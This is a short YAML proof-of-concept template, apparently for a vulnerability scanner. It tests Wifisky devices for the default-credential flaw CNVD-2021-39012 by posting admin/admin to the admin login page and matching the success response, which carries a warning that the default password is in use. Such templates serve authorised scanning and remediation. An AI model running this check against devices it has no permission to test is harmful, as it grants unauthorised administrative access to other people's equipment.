detail:
  author: Print1n(http://print1n.top)
  links:
  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-39012
expression: r0()
manual: true
name: poc-yaml-wifisky-default-password-cnvd-2021-39012
rules:
  r0:
    expression: "response.status == 200 && response.body.bcontains(b\"{\\\"success\\\
      \":\\\"true\\\", \\\"data\\\":{\\\"id\\\":1}, \\\"alert\\\":\\\"\u60A8\u6B63\
      \u5728\u4F7F\u7528\u9ED8\u8BA4\u5BC6\u7801\u767B\u5F55\uFF0C\u4E3A\u4FDD\u8BC1\
      \u8BBE\u5907\u5B89\u5168\uFF0C\u8BF7\u7ACB\u5373\u4FEE\u6539\u5BC6\u7801\\\"\
      }\")"
    request:
      body: username=admin&password=admin
      cache: true
      follow_redirects: false
      method: POST
      path: /login.php?action=login&type=admin
transport: http
